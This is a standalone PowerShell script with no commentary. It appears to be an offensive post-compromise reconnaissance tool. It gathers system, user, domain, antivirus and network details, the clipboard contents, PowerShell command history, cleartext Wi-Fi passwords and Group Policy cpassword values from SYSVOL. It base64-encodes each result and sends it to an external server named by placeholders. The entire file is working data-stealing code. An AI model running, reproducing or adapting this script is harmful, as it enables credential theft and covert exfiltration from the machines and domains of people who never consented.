function Encode64{
param($Text);if($null -eq $Text){return "IA=="}else{$Bytes=[System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);return $EncodedText}
};

$hostname=Encode64(hostname);
$commands = @{
systeminfo=Encode64(systeminfo | out-string);
clipboard=Encode64(Get-Clipboard | out-string);
dir_program_all = Encode64(Get-ChildItem -Force 'C:\Program Files', 'C:\Program Files (x86)', 'C:\ProgramData\' 2>$null | ft Parent,Name,LastWriteTime | out-string);
list_install_programs = Encode64(Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name | out-string);
dir_c_users = Encode64(Get-ChildItem -Force 'C:\Users\' | out-string);
alias = Encode64(Get-ChildItem Alias: | out-string);
env = Encode64(Get-ChildItem Env: | out-string);
variables = Encode64(Get-ChildItem variable: | out-string);
process = Encode64(Get-Process | out-string);
tasklist = Encode64(tasklist /v | out-string);
services = Encode64(Get-Service | out-string);
net_user = Encode64(net user | out-string);
net_localgroups = Encode64(Get-LocalGroup | out-string);
net_localgroups_administrators = Encode64(net localgroup administrators | out-string);
net_localgroups_administradors = Encode64(net localgroup administradors | out-string);
get_local_user = Encode64(Get-LocalUser | ft Name,Enabled,Description,LastLogon | out-string);
net_accounts = Encode64(net accounts);
whoami = Encode64(whoami /all);
antivirus = Encode64(WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName | out-string);
defender_status = Encode64(Get-MpComputerStatus | out-string);
defender_exclusions = Encode64(Get-MpPreference | select Exclusion* | fl | out-string);
history_bis = Encode64(Get-Content C:\Users\$Env:UserName\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt | out-string);
loot_pwd = Encode64(findstr /S cpassword $env:logonserver\sysvol\*.xml | out-string);
scheduled_tasks = Encode64(Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State | out-string);
startup = Encode64(wmic startup get caption,command | out-string);
ping_google = Encode64(ping 8.8.8.8 -n 1 | out-string);
firewall_status = Encode64(Get-NetFirewallRule -Enabled True | out-string);
wifi_profiles = Encode64(netsh wlan show profiles | out-string);
wifi_pwd = Encode64((netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | out-string);
ipconfig = Encode64(ipconfig /all | out-string);
route = Encode64(route print | out-string);
arp = Encode64(Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State | out-string);
hosts = Encode64(Get-Content C:\WINDOWS\System32\drivers\etc\hosts | out-string);
netstat = Encode64(netstat -ano | out-string);
shares = Encode64(net share | out-string);
DOMAIN_net_user = Encode64(net user /domain);
DOMAIN_net_group = Encode64(net group);
DOMAIN_net_group_computers = Encode64(net group "Domain Computers" /domain)
DOMAIN_net_group_admins = Encode64(net group "Domain Admins" /domain)
DOMAIN_net_accounts_domain = Encode64(net accounts /domain);
};
$URL='http://SERVER_EXTERNAL_IP:SERVER_EXTERNAL_PORT/?';
foreach($key in $commands.Keys){$enc_command=$commands[$key];$params=@{hostname=$hostname;$key=$enc_command};$headers=@{'Proof'='1'};Invoke-WebRequest -Uri $URL -Headers $headers -Method GET -Body $params;};
